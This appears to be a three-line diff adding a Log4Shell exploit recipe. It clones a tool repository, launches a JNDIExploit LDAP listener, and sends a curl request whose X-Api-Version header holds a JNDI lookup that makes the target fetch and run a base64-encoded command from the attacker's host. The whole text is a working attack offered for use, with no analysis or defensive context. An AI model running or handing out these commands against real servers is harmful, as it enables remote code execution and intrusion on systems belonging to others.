@@ -1,0 +1,3 @@
+git clone https://github.com/adibmaul11/kkxxpla.git
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+curl ip target -H 'X-Api-Version: ${jndi:ldap://yourip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
